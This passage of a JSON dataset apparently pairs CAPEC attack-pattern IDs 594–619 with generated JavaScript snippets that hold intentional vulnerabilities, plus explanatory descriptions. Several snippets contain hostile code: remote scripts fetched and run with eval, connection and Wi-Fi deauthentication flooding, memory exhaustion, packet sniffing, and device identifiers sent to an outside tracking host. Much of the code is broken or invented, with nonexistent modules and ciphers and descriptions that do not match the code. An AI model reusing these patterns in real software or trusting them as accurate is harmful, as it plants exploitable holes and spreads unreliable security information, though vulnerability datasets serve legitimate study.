    },
    {
        "capec_id": "594",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // CWE-940: No verification of the source of the communication channel\n    // CWE-319: Sensitive information transmitted in cleartext\n    const sensitiveData = 'username:password';\n    socket.write(sensitiveData);\n  });\n  socket.on('error', (err) => {\n    console.error(err);\n  });\n});\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\nconst client = new net.Socket();\nclient.connect(8080, 'localhost', () => {\n  console.log('Connected to server');\n  // CWE-99: Improper control of resource identifiers\n  const maliciousInput = 'maliciousResource';\n  client.write(maliciousInput);\n});\nclient.on('data', (data) => {\n  console.log(`Received: ${data}`);\n  // CWE-924: Improper enforcement of message integrity during transmission\n  // CWE-406: Insufficient control of network message volume\n  for (let i = 0; i < 100; i++) {\n    client.write(data);\n  }\n});",
        "description": "This code snippet demonstrates a vulnerable server and client implementation in Node.js. The server does not verify the source of the communication channel, transmits sensitive information in cleartext, and does not control the volume of network messages. The client injects malicious input into the server, which can affect the system in a particular way. The code also lacks proper enforcement of message integrity during transmission."
    },
    {
        "capec_id": "595",
        "code_snippet": "const net = require('net');\nconst dgram = require('dgram');\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nconst server = net.createServer((socket) => {\n  // No verification of the source of the incoming request\n  socket.on('data', (data) => {\n    console.log('Received data:', data.toString());\n  });\n});\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\nconst client = dgram.createSocket('udp4');\nclient.bind(8081, () => {\n  console.log('Client bound to port 8081');\n});\nclient.on('message', (message, remoteInfo) => {\n  // No verification of message integrity\n  console.log(`Received message from ${remoteInfo.address}:${remoteInfo.port}:`, message.toString());\n});\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nconst maliciousSocket = net.createConnection(8080, 'localhost', () => {\n  console.log('Connected to server');\n});\nmaliciousSocket.write('Reset connection');\n\n// CWE-294: Authentication Bypass by Capture-replay\nconst capturedData = 'captured authentication data';\nmaliciousSocket.write(capturedData);\n\n// CWE-605: Multiple Binds to the Same Port\nconst maliciousServer = net.createServer((socket) => {\n  console.log('Malicious server connected');\n});\nmaliciousServer.listen(8080, () => {\n  console.log('Malicious server listening on port 8080');\n});",
        "description": "This code snippet demonstrates the CAPEC of injecting a connection reset packet to one or both ends of a target's connection. It includes vulnerabilities related to improper verification of the source of a communication channel, improper enforcement of message integrity, incorrectly specified destination, authentication bypass by capture-replay, and multiple binds to the same port."
    },
    {
        "capec_id": "596",
        "code_snippet": "const net = require('net');\nconst http = require('http');\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nconst server = http.createServer((req, res) => {\n  // CWE-918: Server-Side Request Forgery (SSRF)\n  const url = req.url;\n  const proxyReq = http.request(url, (proxyRes) => {\n    res.writeHead(proxyRes.statusCode, proxyRes.headers);\n    proxyRes.pipe(res);\n  });\n\n  // CWE-294: Authentication Bypass by Capture-replay\n  const authHeader = req.headers['authorization'];\n  if (authHeader) {\n    proxyReq.setHeader('Authorization', authHeader);\n  }\n\n  // CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')\n  const smuggledReq = http.request('http://example.com/malicious', (smuggledRes) => {\n    res.writeHead(smuggledRes.statusCode, smuggledRes.headers);\n    smuggledRes.pipe(res);\n  });\n\n  // CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting')\n  smuggledReq.setHeader('Transfer-Encoding', 'chunked');\n  smuggledReq.write('0\\r\\n\\r\\n');\n  smuggledReq.end();\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// CAPEC: TCP RST packet injection\nconst rstPacket = Buffer.from([\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x45, 0x00, 0x00, 0x28, 0x00, 0x00, 0x40, 0x00,\n  0x40, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04,\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00\n]);\n\nconst socket = new net.Socket();\nsocket.connect(8080, 'localhost', () => {\n  socket.write(rstPacket);\n  socket.end();\n});",
        "description": "This code snippet demonstrates a vulnerable HTTP server that is susceptible to TCP RST packet injection, allowing an attacker to terminate the TCP connection. The server also has vulnerabilities related to Server-Side Request Forgery (SSRF), Authentication Bypass by Capture-replay, Inconsistent Interpretation of HTTP Requests, and Improper Neutralization of CRLF Sequences in HTTP Headers."
    },
    {
        "capec_id": "597",
        "code_snippet": "const fs = require('fs');\n\nfunction getFileContents(filePath) {\n  return fs.readFileSync(filePath, 'utf8');\n}\n\nconst userInput = '../secretFiles/topSecret.txt';\n\nconsole.log(getFileContents(userInput));",
        "description": "This JavaScript code snippet demonstrates the CAPEC of Path Traversal. The getFileContents function reads the contents of a file specified by the filePath parameter. The userInput variable is set to '../secretFiles/topSecret.txt', which is an example of an absolute path traversal attack. The getFileContents function does not properly neutralize the '../' sequence, allowing an attacker to access files outside of the intended directory."
    },
    {
        "capec_id": "598",
        "code_snippet": "const dns = require('dns');\nconst http = require('http');\n\n// CWE-350: Reliance on Reverse DNS Resolution for a Security-Critical Action\nfunction getHostname(ip) {\n  return new Promise((resolve, reject) => {\n    dns.reverse(ip, (err, hostname) => {\n      if (err) reject(err);\n      else resolve(hostname);\n    });\n  });\n}\n\n// CWE-941: Incorrectly Specified Destination in a Communication Channel\nasync function makeRequest(ip) {\n  const hostname = await getHostname(ip);\n  const url = `http://${hostname}/malicious-code.js`;\n  const req = http.get(url, (res) => {\n    res.on('data', (data) => {\n      // CWE-494: Download of Code Without Integrity Check\n      eval(data.toString());\n    });\n  });\n}\n\n// CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\nhttp.createServer((req, res) => {\n  const redirectUrl = req.url;\n  res.writeHead(302, { Location: redirectUrl });\n  res.end();\n}).listen(8080);\n\n// CWE-918: Server-Side Request Forgery (SSRF)\nasync function ssrf(ip) {\n  const req = http.request(`http://${ip}:8080`, (res) => {\n    res.on('data', (data) => {\n      console.log(data.toString());\n    });\n  });\n  req.end();\n}\n\nmakeRequest('1.2.3.4');\nssrf('1.2.3.4');",
        "description": "This code snippet demonstrates a DNS spoofing attack, where an adversary sends a malicious DNS response to a target's route request. The code relies on reverse DNS resolution to obtain the hostname, which can be tampered with by the adversary. The code then downloads and executes malicious code from the tampered hostname, without verifying its integrity. The code also includes an open redirect vulnerability, which can be used to redirect users to malicious sites. Finally, the code demonstrates a server-side request forgery (SSRF) vulnerability, where the server makes an outgoing request to a user-controlled destination."
    },
    {
        "capec_id": "599",
        "code_snippet": "const satelliteSignal = { freq: 1234, data: 'sensitive_info' };\nconst jammer = (signal) => {\n  const disruptedSignal = { freq: signal.freq, data: 'malicious_data' };\n  return disruptedSignal;\n};\nconst receiveSignal = (signal) => {\n  console.log(`Received signal: ${signal.freq} - ${signal.data}`);\n};\n\n// CWE-924: No message integrity check\nreceiveSignal(jammer(satelliteSignal));\n\n// CWE-923: No endpoint verification\nconst maliciousEndpoint = 'malicious.com';\nconst sendSignal = (endpoint, signal) => {\n  // Send signal to endpoint without verifying its authenticity\n  console.log(`Sending signal to ${endpoint}: ${signal.freq} - ${signal.data}`);\n};\n\nsendSignal(maliciousEndpoint, satelliteSignal);\n\n// CWE-319: Cleartext transmission of sensitive information\nconst cleartextSignal = { freq: 1234, data: 'cleartext_sensitive_info' };\nconsole.log(`Sending cleartext signal: ${cleartextSignal.freq} - ${cleartextSignal.data}`);\n\n// CWE-927: Use of implicit intent for sensitive communication (Android-specific, not applicable in this JavaScript example)\n\n// CWE-1316: Not applicable in this JavaScript example",
        "description": "This code snippet demonstrates the CAPEC attack pattern by simulating a satellite signal disruption using a terrestrial jammer. The code includes vulnerabilities related to CWE-924 (improper message integrity), CWE-923 (improper endpoint verification), CWE-319 (cleartext transmission of sensitive information), and CWE-927 (use of implicit intent for sensitive communication, although not applicable in this JavaScript example). CWE-1316 is not applicable in this JavaScript example."
    },
    {
        "capec_id": "600",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst users = {\n  'user1': 'password1',\n  'user2': 'password2',\n  // ...\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] === password) {\n    res.send('Login successful!');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable login system that is susceptible to credential stuffing attacks. It uses a simple username/password combination stored in a JavaScript object, with no protection against brute force attacks, no password aging, and single-factor authentication. An attacker can try multiple username/password combinations to gain access to the system."
    },
    {
        "capec_id": "601",
        "code_snippet": "const net = require('net');\nconst crypto = require('crypto');\n\n// CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\nconst server = net.createServer((socket) => {\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n  socket.on('data', (data) => {\n    // No message integrity check\n    processMessage(data);\n  });\n});\n\n// CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\nserver.on('connection', () => {\n  // No rate limiting or traffic control\n  console.log('New connection established');\n});\n\n// CWE-319: Cleartext Transmission of Sensitive Information\nconst sensitiveData = 'secretKey';\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n  // CWE-421: Race Condition During Access to Alternate Channel\n  const alternateChannel = net.connect(8081, () => {\n    alternateChannel.write(sensitiveData);\n  });\n});\n\n// CWE-406: Insufficient Control of Network Message Volume (Network Amplification)\nsetInterval(() => {\n  // Flood the network with traffic\n  for (let i = 0; i < 1000; i++) {\n    const socket = net.connect(8080, () => {\n      socket.write('flooding...');\n    });\n  }\n}, 1000);",
        "description": "This code snippet demonstrates a vulnerable server that can be exploited by an adversary to disrupt communications. The server does not properly enforce message integrity, allowing an attacker to modify messages during transmission. It also lacks rate limiting, making it vulnerable to network amplification attacks. Furthermore, the server transmits sensitive information in cleartext and has a race condition during access to an alternate channel. An attacker can exploit these vulnerabilities to flood the network with traffic, causing a denial of service."
    },
    {
        "capec_id": "602",
        "code_snippet": "const dns = require('dns');\n\nfunction authenticateUser(username, password) {\n  dns.lookup('example.com', (err, address) => {\n    if (address === '192.0.2.1') {\n      // authenticate user based on DNS lookup result\n      return true;\n    } else {\n      // use deprecated function to load dynamic class\n      const MyClass = require('./MyClass');\n      return MyClass.authenticate(username, password);\n    }\n  });\n}\n\n// use obsolete function to store data\nconst fs = require('fs');\nfs.writeFileSync('user_data.txt', 'username=' + username + '&password=' + password);\n",
        "description": "This code snippet demonstrates a deprecated authentication mechanism that relies on DNS lookups to make security decisions (CWE-247) and uses an obsolete function to store user data (CWE-477). It also uses dynamic class loading (CWE-545) and has potential authentication bypass issues (CWE-592). The code is vulnerable to modification of stored data (CWE-217) and uses a deprecated function to load a dynamic class."
    },
    {
        "capec_id": "603",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  let arr = [];\n  while (true) {\n    arr.push(new Array(1000000));\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a denial-of-service (DoS) attack by allocating unlimited resources (memory) without any throttling or limits, leading to system failure or stoppage. The while loop continuously allocates large arrays, eventually exhausting the available memory and causing the system to crash or become unresponsive."
    },
    {
        "capec_id": "604",
        "code_snippet": "const wifi = require('wifi');\nconst deauthFrame = Buffer.from('000080000600010007', 'hex');\n\nwifi.startMonitoring((err) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log('Started monitoring Wi-Fi channel');\n    setInterval(() => {\n      wifi.sendFrame(deauthFrame);\n    }, 100);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a Wi-Fi deauthentication attack, which is a type of denial-of-service attack that can be used to disconnect users from a targeted Wi-Fi network. The code uses the 'wifi' module to start monitoring the Wi-Fi channel and send deauthentication frames at regular intervals, effectively flooding the Wi-Fi access point and preventing users from transmitting or receiving data. This code embodies the CAPEC and CWEs by not ensuring the integrity of the message transmission (CWE-924), not restricting the communication channel to the intended endpoint (CWE-923), not verifying the source of the communication channel (CWE-940), and transmitting sensitive information in cleartext (CWE-319)."
    },
    {
        "capec_id": "605",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.post('/celltower', (req, res) => {\n  const signalStrength = req.body.signalStrength;\n  const statusMessage = req.body.statusMessage;\n  // CWE-924: No message integrity check\n  // CWE-940: No verification of source of request\n  if (signalStrength > 100) {\n    // CWE-300: Channel accessible by non-endpoint\n    // CWE-319: Cleartext transmission of sensitive information\n    const noiseLevel = Math.random() * 100;\n    console.log(`Introducing noise level: ${noiseLevel}`);\n    res.send(`Noise level introduced: ${noiseLevel}`);\n  } else {\n    // CWE-1300: Improper protection of physical side channels\n    const powerConsumption = Math.random() * 100;\n    console.log(`Power consumption: ${powerConsumption}`);\n    res.send(`Power consumption: ${powerConsumption}`);\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable cellular network communication system. It receives requests from cellular user devices and introduces noise or modifies power consumption levels without proper verification of the request source or message integrity, making it susceptible to attacks that overpower and disrupt communication between the device and the cell tower."
    },
    {
        "capec_id": "606",
        "code_snippet": "const crypto = require('crypto');\n\nfunction negotiateEncryption(client, server) {\n  const availableAlgorithms = ['A5/0', 'A5/1', 'A5/2'];\n  const chosenAlgorithm = availableAlgorithms[0]; // Selecting the weakest algorithm\n\n  if (chosenAlgorithm === 'A5/0') {\n    return crypto.createCipher('aes-128-cbc', 'hardcodedkey'); // Hardcoded key and weak encryption\n  } else if (chosenAlgorithm === 'A5/1' || chosenAlgorithm === 'A5/2') {\n    return crypto.createCipher('aes-128-cbc', 'hardcodedkey'); // Hardcoded key and weak encryption\n  }\n}\n\nconst client = {\n  send: function(data) {\n    const cipher = negotiateEncryption(this, server);\n    const encryptedData = cipher.update(data, 'utf8', 'hex');\n    return encryptedData;\n  }\n};\n\nconst server = {\n  receive: function(data) {\n    const decipher = crypto.createDecipher('aes-128-cbc', 'hardcodedkey');\n    const decryptedData = decipher.update(data, 'hex', 'utf8');\n    return decryptedData;\n  }\n};",
        "description": "This code snippet demonstrates the CAPEC of forcing a mobile device to use no encryption (A5/0 mode) or weak encryption (A5/1 or A5/2 mode) during negotiation. It incorporates CWEs 757 (Algorithm Downgrade), 326 (Inadequate Encryption Strength), 924 (Improper Enforcement of Message Integrity), 321 (Use of Hard-coded Cryptographic Key), and 327 (Use of a Broken or Risky Cryptographic Algorithm). The code selects the weakest encryption algorithm, uses a hardcoded key, and does not ensure message integrity during transmission."
    },
    {
        "capec_id": "607",
        "code_snippet": "const redundantSystem = {\n  componentA: {\n    execute: function() {\n      // CWE-653: Improper Isolation or Compartmentalization\n      // No proper isolation of componentB\n      componentB.execute();\n    }\n  },\n  componentB: {\n    execute: function() {\n      // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n      // No error handling or redundancy check\n      if (Math.random() < 0.5) {\n        throw new Error('Injected error');\n      }\n    }\n  }\n};\n\n// CWE-693: Protection Mechanism Failure\n// No protection mechanism to prevent obstruction\nsetInterval(() => {\n  try {\n    redundantSystem.componentA.execute();\n  } catch (e) {\n    console.log('Error occurred:', e);\n  }\n}, 1000);\n\n// CWE-1332: Improper Handling of Faults that Lead to Instruction Skips\n// No fault detection or mitigation\nconst cpuInstructions = ['instruction1', 'instruction2'];\nfor (let i = 0; i < cpuInstructions.length; i++) {\n  try {\n    executeInstruction(cpuInstructions[i]);\n  } catch (e) {\n    console.log('Error occurred:', e);\n  }\n}\n\n// CWE-1298: Hardware Logic Contains Race Conditions\n// No synchronization or locking mechanism\nlet sharedResource = 0;\nconst threads = [];\nfor (let i = 0; i < 10; i++) {\n  threads.push(setInterval(() => {\n    sharedResource++;\n  }, 10));\n}",
        "description": "This code snippet demonstrates the CAPEC of obstructing interactions between system components, leading to a degraded state or system failure. It incorporates CWE-693 (Protection Mechanism Failure), CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy), CWE-653 (Improper Isolation or Compartmentalization), CWE-1332 (Improper Handling of Faults that Lead to Instruction Skips), and CWE-1298 (Hardware Logic Contains Race Conditions) to showcase the vulnerabilities."
    },
    {
        "capec_id": "608",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-327: Using a broken or risky cryptographic algorithm (A5/1)\nconst cipher = crypto.createCipher('A5/1', 'hardcoded_key');\n\n// CWE-321: Hard-coded cryptographic key\nconst hardcodedKey = '1234567890abcdef';\n\n// CWE-326: Inadequate encryption strength (using a weak key size)\nconst weakKey = crypto.randomBytes(8);\n\n// CWE-757: Selection of less-secure algorithm during negotiation (downgrading to A5/1)\nfunction negotiateAlgorithm() {\n  return 'A5/1';\n}\n\n// CWE-1300: Improper protection of physical side channels (leaking sensitive information through power consumption patterns)\nfunction transmitData(data) {\n  // Simulating power consumption patterns\n  for (let i = 0; i < 100; i++) {\n    // Perform some CPU-intensive operation\n    crypto.createHash('sha256').update(data).digest();\n  }\n  // Transmit the data using the weak A5/1 algorithm\n  const encryptedData = cipher.update(data, 'utf8', 'hex');\n  return encryptedData;\n}\n\n// Example usage\nconst data = 'Sensitive information';\nconst encryptedData = transmitData(data);\nconsole.log(encryptedData);",
        "description": "This code snippet demonstrates the use of a broken or risky cryptographic algorithm (A5/1), hard-coded cryptographic keys, inadequate encryption strength, algorithm downgrade, and improper protection of physical side channels. It simulates a vulnerable cellular encryption system that can be exploited by an attacker to reveal traffic content."
    },
    {
        "capec_id": "609",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/sensitiveData', (req, res) => {\n  const sensitiveInfo = { username: 'admin', password: 'password123' };\n  res.send(sensitiveInfo);\n});\n\nconst unverifiedConnection = new WebSocket('ws://untrusted-origin.com');\n\nunverifiedConnection.onmessage = (event) => {\n  const receivedData = event.data;\n  console.log(`Received data from unverified source: ${receivedData}`);\n};\n\nconst cleartextData = 'username=admin&password=password123';\nconst xhr = new XMLHttpRequest();\nxhr.open('POST', 'https://example.com/login', true);\nxhr.send(cleartextData);\n",
        "description": "This code snippet demonstrates the CAPEC of intercepting cellular traffic by showcasing vulnerable code that transmits sensitive information in cleartext, establishes unverified communication channels, and fails to ensure message integrity. It includes CWEs 311, 940, 924, 319, and 927."
    },
    {
        "capec_id": "610",
        "code_snippet": "const net = require('net');\nconst debugMode = true;\n\nconst server = net.createServer((socket) => {\n  if (debugMode) {\n    socket.on('data', (data) => {\n      // CWE-1313: Activate test/debug logic at runtime\n      const testData = 'TEST_DATA';\n      socket.write(testData);\n    });\n  }\n\n  socket.on('data', (data) => {\n    // CWE-319: Cleartext transmission of sensitive information\n    const sensitiveData = 'SENSITIVE_INFO';\n    socket.write(sensitiveData);\n  });\n\n  socket.on('data', (data) => {\n    // CWE-924: Improper enforcement of message integrity during transmission\n    const message = 'MESSAGE_FROM_CLIENT';\n    const alteredMessage = message + '_ALTERED';\n    socket.write(alteredMessage);\n  });\n\n  socket.on('data', (data) => {\n    // CWE-201: Insertion of sensitive information into sent data\n    const userData = 'USER_DATA';\n    const sensitiveInfo = 'SENSITIVE_INFO';\n    socket.write(userData + '_' + sensitiveInfo);\n  });\n\n  socket.on('data', (data) => {\n    // CWE-406: Insufficient control of network message volume (network amplification)\n    for (let i = 0; i < 1000; i++) {\n      socket.write('AMPLIFIED_MESSAGE');\n    }\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});",
        "description": "This JavaScript code snippet demonstrates the CAPEC of injecting data into mobile technology traffic to disrupt communications or conduct additional surveillance operations. It includes CWEs such as activating test/debug logic at runtime, cleartext transmission of sensitive information, improper enforcement of message integrity during transmission, insertion of sensitive information into sent data, and insufficient control of network message volume (network amplification)."
    },
    {
        "capec_id": "611",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/redirect', (req, res) => {\n  const userInput = req.query.url;\n  if (userInput) {\n    res.redirect(userInput);\n  }\n});\n\napp.get('/download', (req, res) => {\n  const scriptUrl = req.query.script;\n  if (scriptUrl) {\n    const https = require('https');\n    https.get(scriptUrl, (response) => {\n      let data = '';\n      response.on('data', (chunk) => {\n        data += chunk;\n      });\n      response.on('end', () => {\n        eval(data);\n      });\n    });\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that is susceptible to BitSquatting attacks. The '/redirect' endpoint accepts a user-controlled input 'url' and redirects the user to that URL, which can be an adversary-controlled domain with a single bit difference from a trusted domain (CWE-601). The '/download' endpoint downloads and executes a script from a user-controlled URL without verifying its origin and integrity (CWE-494). An adversary can exploit this by registering a domain name with a single bit difference from a trusted domain and hosting a malicious script, which can be executed by the vulnerable application. Additionally, the use of the GET request method with sensitive query strings (CWE-598) and the lack of authentication mechanisms make the application vulnerable to capture-replay attacks (CWE-294) and phishing attacks."
    },
    {
        "capec_id": "612",
        "code_snippet": "const wifi = require('wifi');\nconst macAddresses = {};\n\nwifi.on('message', (message) => {\n  const macAddress = message.macAddress;\n  if (!macAddresses[macAddress]) {\n    macAddresses[macAddress] = [];\n  }\n  macAddresses[macAddress].push(message.data);\n});\n\nfunction trackUser(macAddress) {\n  return macAddresses[macAddress];\n}\n\n// Example usage:\nconst userMacAddress = '00:11:22:33:44:55';\nconst userData = trackUser(userMacAddress);\nconsole.log(userData);\n",
        "description": "This code snippet demonstrates a vulnerable WiFi tracking system that stores MAC addresses and associated user data in a JavaScript object. The 'wifi.on' function listens for incoming WiFi messages and logs the MAC addresses and data. The 'trackUser' function allows an attacker to retrieve user data by MAC address, without verifying the identity of the requesting actor or ensuring the integrity of the communication channel. This code embodies CWE-201 by transmitting sensitive user data, CWE-300 by not verifying the identity of actors, CWE-421 by allowing access to the communication channel, CWE-1316 by not properly separating protected and unprotected regions, and CWE-529 by storing access control data in an accessible location."
    },
    {
        "capec_id": "613",
        "code_snippet": "const wifi = require('wifi');\n\nfunction trackUser(ssid) {\n  wifi.scan((error, networks) => {\n    if (error) {\n      console.error(error);\n    } else {\n      networks.forEach((network) => {\n        if (network.ssid === ssid) {\n          console.log(`User found at ${network.mac}`);\n        }\n      });\n    }\n  });\n}\n\n// Example usage:\nconst userSsid = 'public_wifi';\ntrackUser(userSsid);\n",
        "description": "This code snippet demonstrates the CAPEC attack scenario where an attacker tracks a user by listening for WiFi management frame messages containing the Service Set Identifier (SSID) for the WiFi network. The code uses the 'wifi' module to scan for nearby WiFi networks and logs the user's location when the specified SSID is found. This code embodies CWE-201 by transmitting sensitive information (the user's location) without proper access control, CWE-300 by not verifying the identity of the actor at the other end of the communication channel, CWE-1290 by incorrectly decoding security identifiers, CWE-1192 by not using unique identifiers for system components, and CWE-1302 by missing source identifiers in entity transactions."
    },
    {
        "capec_id": "614",
        "code_snippet": "const crypto = require('crypto');\n\n// CWE-327: Using a broken or risky cryptographic algorithm (DES)\nconst desKey = 'weak_key';\nconst encryptedData = crypto.createCipher('des-cbc', desKey).update('malicious_code', 'utf8', 'hex');\n\n// CWE-326: Inadequate encryption strength (using DES with a weak key)\nconst signedBinarySMS = crypto.sign('sha1', encryptedData, desKey);\n\n// CWE-1277: Firmware not updateable (assuming the SIM firmware is not updateable)\nconst simFirmware = {\n  executeJavaApplet: (applet) => {\n    // CWE-1297: Unprotected confidential information on device accessible by OSAT vendors\n    const confidentialInfo = getConfidentialInfoFromDevice();\n    // CWE-1191: On-chip debug and test interface with improper access control\n    const debugInterface = getDebugInterface();\n    debugInterface.execute(applet);\n  }\n};\n\n// Send the malicious Java applet to the SIM\nsendSMS(signedBinarySMS, 'malicious_java_applet');",
        "description": "This code snippet demonstrates the CAPEC attack by leveraging over-the-air (OTA) updates to deliver executable code to the SIM. It uses a broken or risky cryptographic algorithm (DES) with an inadequate encryption strength (weak key) to sign the binary SMS message. The code assumes the SIM firmware is not updateable and uses an unprotected confidential information on the device accessible by OSAT vendors. It also uses an on-chip debug and test interface with improper access control to execute the malicious Java applet on the SIM."
    },
    {
        "capec_id": "615",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst wifi = require('node-wifi');\n\nwifi.init({\n  iface : 'wlan0'\n});\n\napp.use(express.json());\n\napp.post('/connect', (req, res) => {\n  const ssid = req.body.ssid;\n  const password = req.body.password;\n  wifi.connect({ ssid: ssid, password: password }, (error) => {\n    if (error) {\n      console.log(error);\n    } else {\n      console.log('Connected to ' + ssid);\n      // Start sniffing traffic\n      const pcap = require('pcap');\n      const pcapSession = pcap.createSession('wlan0', 'ether');\n      pcapSession.on('packet', (rawPacket) => {\n        const packet = pcap.decode.packet(rawPacket);\n        console.log(packet);\n      });\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a malicious Wi-Fi access point that intercepts and captures Wi-Fi data traffic. It uses the 'node-wifi' library to connect to a Wi-Fi network and the 'pcap' library to sniff traffic. The server listens for incoming connections and captures packets, allowing an adversary to access sensitive information. This code embodies CWE-300, CWE-923, CWE-940, CWE-319, and CWE-924 by not verifying the identity of actors, not ensuring the integrity of the communication channel, transmitting sensitive information in cleartext, and not properly verifying the source of incoming requests."
    },
    {
        "capec_id": "616",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nconst userInput = 'https://example.com/malicious-resource'; // Untrusted input\nconst resourcePath = path.join(__dirname, userInput);\n\nfs.readFile(resourcePath, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});",
        "description": "This code snippet demonstrates the CAPEC by allowing an adversary to provide a malicious version of a resource at a location that is similar to the expected location of a legitimate resource. The CWEs embodied in this code snippet include CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as the code reads a file from an untrusted input, CWE-940 (Improper Verification of Source of a Communication Channel) as it does not verify the origin of the input, CWE-1229 (Creation of Emergent Resource) as it creates a new resource by reading the file, CWE-402 (Transmission of Private Resources into a New Sphere) as it makes the resource available to untrusted parties, and CWE-426 (Untrusted Search Path) as it uses an externally-supplied search path to find the resource."
    },
    {
        "capec_id": "617",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst http = require('http');\nconst server = http.createServer(app);\nconst io = require('socket.io')(server);\n\nlet clients = {};\n\napp.get('/', (req, res) => {\n  res.sendFile(__dirname + '/index.html');\n});\n\nio.on('connection', (socket) => {\n  console.log('New client connected');\n  clients[socket.id] = socket;\n\n  socket.on('message', (message) => {\n    // CWE-940: No verification of the source of the communication channel\n    // CWE-300: No verification of the identity of the actor at the other end of the channel\n    io.emit('message', message);\n  });\n\n  socket.on('disconnect', () => {\n    console.log('Client disconnected');\n    delete clients[socket.id];\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable communication channel in a JavaScript application. The server establishes a communication channel with clients using Socket.IO, but it does not properly verify the source of incoming requests (CWE-940) or the identity of actors at the other end of the channel (CWE-300). This allows an attacker to imitate a legitimate client and send malicious messages to the server, which will then broadcast them to all connected clients. Additionally, the code does not ensure the integrity of the channel (CWE-924), allowing an attacker to modify messages during transmission. The server also does not restrict the communication channel to intended endpoints (CWE-923), making it accessible to unauthorized actors. Finally, the code is vulnerable to race conditions during access to alternate channels (CWE-421), allowing an attacker to exploit the communication channel."
    },
    {
        "capec_id": "618",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst sms = require('sms-api');\n\napp.post('/location', (req, res) => {\n  const phoneNumber = req.body.phoneNumber;\n  const lac = req.body.lac;\n  const message = 'Location alert';\n\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  sms.send(phoneNumber, message, (err, data) => {\n    if (err) {\n      console.error(err);\n    } else {\n      // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n      // No message integrity check is performed\n      res.send(`Message sent to ${phoneNumber}`);\n    }\n  });\n});\n\napp.post('/verify', (req, res) => {\n  const phoneNumber = req.body.phoneNumber;\n  const lac = req.body.lac;\n\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  // No verification of the request source is performed\n  const message = `Location verification for ${phoneNumber} in LAC ${lac}`;\n  res.send(message);\n});",
        "description": "This code snippet demonstrates a vulnerable server-side implementation that allows an attacker to verify the location of a target mobile device using cellular broadcast messages. The server accepts a phone number and Location Area Code (LAC) as input, sends a broadcast message to the target device, and then verifies the presence or absence of the message to determine the target's location. The code is vulnerable to CWE-201, CWE-924, and CWE-940."
    },
    {
        "capec_id": "619",
        "code_snippet": "const wifi = require('wifi');\nconst cellular = require('cellular');\n\nfunction getLocation() {\n  const wifiSignal = wifi.getSignalStrength();\n  const cellularSignal = cellular.getSignalStrength();\n  const locationData = {\n    'wifiSignal': wifiSignal,\n    'cellularSignal': cellularSignal,\n    'deviceID': getDeviceID(),\n    'imsi': getIMSI(),\n    'macAddress': getMACAddress()\n  };\n  sendLocationData(locationData);\n}\n\nfunction sendLocationData(data) {\n  const socket = new WebSocket('wss://location-tracker.com');\n  socket.onmessage = (event) => {\n    if (event.data === 'request-location') {\n      socket.send(JSON.stringify(data));\n    }\n  };\n}\n\nfunction getDeviceID() {\n  return 'device-' + Math.random().toString(36).substr(2, 9);\n}\n\nfunction getIMSI() {\n  return 'imsi-' + Math.random().toString(36).substr(2, 15);\n}\n\nfunction getMACAddress() {\n  return 'mac-' + Math.random().toString(36).substr(2, 12);\n}\n",
